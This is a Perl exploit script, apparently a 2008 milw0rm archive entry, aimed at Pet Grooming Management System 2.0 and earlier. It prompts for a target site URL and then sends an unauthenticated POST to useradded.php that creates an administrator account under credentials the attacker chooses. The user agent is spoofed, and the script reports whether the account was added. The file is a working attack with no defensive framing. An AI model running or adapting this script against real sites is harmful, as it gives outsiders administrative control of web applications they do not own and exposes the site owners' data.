#!/usr/bin/perl

use strict;
use LWP::UserAgent;

print "-+- Pet Grooming Management System <= 2.0 Arbitrary Add-Admin Exploit -+-\n";
print "-+-  Discovered && Coded By: t0pP8uZz  -  Discovered On: 15 MAY 2008  -+-\n";
print "-+-  Script Download: http://sourceforge.net/projects/petgroom/       -+-\n";
print "-+- Pet Grooming Management System <= 2.0 Arbitrary Add-Admin Exploit -+-\n";

print "\nEnter URL(http://site.com/pet/): ";
	chomp(my $url=<STDIN>);
	
print "\nEnter Username(create your admin username): ";
	chomp(my $user=<STDIN>);
	
print "\nEnter Password(create your admin password): ";
	chomp(my $pass=<STDIN>);

my $ua = LWP::UserAgent->new( agent => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)' );
my $ob = $ua->post($url."/useradded.php", { "name" => "admin", "user" => $user, "pwd" => $pass, "level" => 1, "centerstatus" => "a" } );

if($ob->is_success && index($ob->content, 10) != -1) {
	print "\n\nUser Added Successfully! Login to: $url\n";
} else { print "\n\nUser was not added. Username may be in use, or site isnt running PGMS.\n"; }

# milw0rm.com [2008-05-15]